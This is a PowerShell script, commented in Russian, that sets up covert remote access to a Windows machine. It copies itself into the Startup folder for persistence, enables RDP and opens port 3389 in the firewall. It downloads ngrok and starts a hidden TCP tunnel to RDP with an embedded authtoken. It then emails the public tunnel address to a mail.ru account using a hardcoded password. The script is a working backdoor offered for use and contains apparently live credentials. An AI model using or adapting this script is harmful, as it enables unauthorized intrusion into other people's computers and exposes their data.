Start-Sleep -Seconds 10 # Пауза для появления интернета

$logFile = "$env:TEMP\ngrok_log.txt"
function Log($msg) {
    "[$(Get-Date)] $msg" | Out-File -FilePath $logFile -Append
}

Log "Скрипт запущен"
$thisScript        = $MyInvocation.MyCommand.Path
Log "Текущий скрипт: $thisScript"

$startupScriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ngrok.ps1"
if ($thisScript -ne $startupScriptPath -and !(Test-Path $startupScriptPath)) {
    Copy-Item -Path $thisScript -Destination $startupScriptPath -Force
    Log "Скрипт скопирован в автозагрузку: $startupScriptPath"
    exit
}

try {
    Start-Process reg -ArgumentList 'add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f' -Verb runAs | Out-Null
    Log "RDP включён"
} catch {
    Log "Ошибка при включении RDP: $_"
}

try {
    netsh advfirewall firewall add rule `
        name="ngrok RDP" `
        dir=in action=allow `
        protocol=TCP localport=3389 `
        description="Allow inbound RDP for ngrok" | Out-Null
    Log "Firewall правило добавлено"
} catch {
    Log "Ошибка при добавлении firewall правила: $_"
}

$ngrokDir   = "$env:APPDATA\ngrok"
$ngrokExe   = Join-Path $ngrokDir "ngrok.exe"
$tempZip    = "$env:TEMP\ngrok.zip"

if (!(Test-Path $ngrokExe)) {
    try {
        Invoke-WebRequest -Uri "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip" -OutFile $tempZip
        Expand-Archive -Path $tempZip -DestinationPath $ngrokDir -Force
        Log "Ngrok загружен и распакован"
    } catch {
        Log "Ошибка при загрузке ngrok: $_"
    }
} else {
    Log "Ngrok уже установлен"
}

$ngrokConfigDir = "$env:USERPROFILE\.ngrok2"
$ngrokConfig    = Join-Path $ngrokConfigDir "ngrok.yml"
if (!(Test-Path $ngrokConfig)) {
    try {
        if (!(Test-Path $ngrokConfigDir)) { New-Item -ItemType Directory -Path $ngrokConfigDir | Out-Null }
        @"
authtoken: 2xe3OPcwxui4icUAn8vBgxysHzH_6ceP3DS71bZm5mRxktwua
"@ | Out-File -Encoding ASCII $ngrokConfig
        Log "Конфиг ngrok создан"
    } catch {
        Log "Ошибка при создании ngrok.yml: $_"
    }
}

Start-Process -FilePath $ngrokExe -ArgumentList "tcp 3389" -WindowStyle Hidden
Log "Ngrok запущен"

$tunnelAddress = $null
for ($i = 0; $i -lt 30; $i++) {
    try {
        $resp = Invoke-RestMethod -Uri "http://127.0.0.1:4040/api/tunnels" -TimeoutSec 2
        $tcpTunnel = $resp.tunnels | Where-Object { $_.proto -eq "tcp" }
        if ($tcpTunnel?.public_url) {
            $tunnelAddress = $tcpTunnel.public_url
            Log "Tunnel получен: $tunnelAddress"
            break
        }
    } catch {
        Start-Sleep -Seconds 1
    }
}

# Независимо от tunnelAddress, шлём лог
$smtpServer = "smtp.mail.ru"
$smtpPort   = 587
$smtpUser   = "user.default00@mail.ru"
$smtpPass   = "DggLc7dSWENCbM56151O"

$fromEmail = $smtpUser
$toEmail   = "user.default00@mail.ru"
$subject   = "Ngrok RDP адрес"
$body      = if ($tunnelAddress) {
    "Ngrok публичный TCP адрес:`n`t$tunnelAddress"
} else {
    "Не удалось получить tunnel от ngrok."
}

try {
    $cred = New-Object System.Management.Automation.PSCredential(
        $smtpUser,
        (ConvertTo-SecureString $smtpPass -AsPlainText -Force)
    )
    Send-MailMessage `
        -From $fromEmail `
        -To $toEmail `
        -Subject $subject `
        -Body $body `
        -SmtpServer $smtpServer `
        -Port $smtpPort `
        -UseSsl `
        -Credential $cred `
        -ErrorAction Stop
    Log "Письмо отправлено"
} catch {
    Log "Ошибка при отправке email: $_"
}
